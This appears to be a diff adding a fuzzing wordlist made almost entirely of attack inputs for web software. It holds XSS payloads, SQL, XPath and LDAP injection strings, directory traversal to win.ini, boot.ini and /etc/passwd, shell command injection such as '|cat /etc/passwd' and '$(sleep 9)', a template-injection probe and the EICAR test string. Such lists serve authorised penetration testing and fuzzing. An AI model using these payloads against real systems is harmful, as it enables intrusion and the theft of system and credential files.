+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+=
+>index.html
+?
+@
+@any
+False
+String(//users[LoginID/text()='abc' or 1=1 or 'a'='b' and passwd/text()=''])
+null
+true
+1
+0
+-1
+false
+True
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+[
+<script>
+%3c%73%63%72%69%70%74%3e
+%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65
+\
+';alert('XSS');//
+');alert('XSS');//
+*/ alert('XSS'); //
+\"
+\";alert('XSS');//
+\'
+\''
+\'or\'\'=\'
+$(ehco a)
+$(sleep 9)
+\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
+\..\..\..\..\..\..\..\..\..\..\..\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\win.ini%00
+\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\\\"
+\\\'
+\boot.ini
+\boot.ini%00
+\win.ini
+\win.ini%00
+]
+]/
+^
+_
+`
+`dir`
+`or`1`=`
+`or``=`
+abc' or name(//users/LoginID[1]) = 'LoginID' or 'a'='b
+c
+cn
+dc
+dir|
+dn
+e
+false
+givenname
+http://www.google.com
+l
+mail
+nul
+null
+o
+objectclass
+or--
+ou
+postaladdress
+sn
+string(//user/account/text())
+string(//user[name/text()='' or 1=1 or ''='' and password/text()='foobar']/account/text())
+true
+uid
+x\\|
+{
+|
+|@#\<>,.-_:;{}'ç"`+[]^*'¡?¿()/\¬%$·!ºª\!
+|dir
+}
+~
+¡
+ª
+¬
+·
+º
+¿
+Ç¨
+ç
+ñ
+`
+'
+</xml>]]/\'or 1=1 or \'\'=\'
+|sleep+6+#+$(sleep 6)+#+`sleep 6`;sleep+6+#;
+|cat /etc/passwd #$(cat /etc/passwd)#`cat /etc/passwd`;cat /etc/passwd #;
+|cat$IFS/etc/passwd $(cat$IFS/etc/passwd)`cat$IFS/etc/passwd`;cat$IFS/etc/passwd;
+%27%22%25%32%37%25%32%32
+{{1330+7}}
